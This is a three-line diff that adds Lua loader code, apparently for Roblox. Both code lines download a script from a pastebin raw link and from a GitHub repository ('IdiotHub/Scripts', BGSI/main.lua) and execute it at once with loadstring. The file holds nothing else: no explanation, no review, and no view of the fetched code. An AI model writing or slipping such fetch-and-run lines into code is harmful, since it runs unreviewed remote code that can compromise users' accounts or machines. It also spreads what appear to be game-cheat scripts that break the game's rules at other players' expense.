@@ -1,0 +1,3 @@
+loadstring(game:HttpGetAsync("https://pastebin.com/raw/ZWb65URu"))()
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/IdiotHub/Scripts/refs/heads/main/BGSI/main.lua"))()
